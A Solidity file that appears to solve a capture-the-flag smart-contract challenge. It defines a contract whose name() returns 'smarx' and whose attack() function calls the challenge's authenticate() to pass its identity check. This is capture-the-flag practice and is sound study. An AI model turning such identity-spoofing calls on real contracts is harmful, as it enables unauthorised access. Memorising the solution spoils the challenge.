// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IName {
    function name() external view returns (bytes32);
}

interface IFuzzyIdentityChallenge {
    function isComplete() external returns (bool);
    function authenticate() external;
}
contract NameContract is IName {
    IFuzzyIdentityChallenge challenge;

    constructor(address _challenge) {
        challenge = IFuzzyIdentityChallenge(_challenge);
    }
    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }
    function attack() external {
        challenge.authenticate();
        require(challenge.isComplete(), "Authentication failed");
    }
}
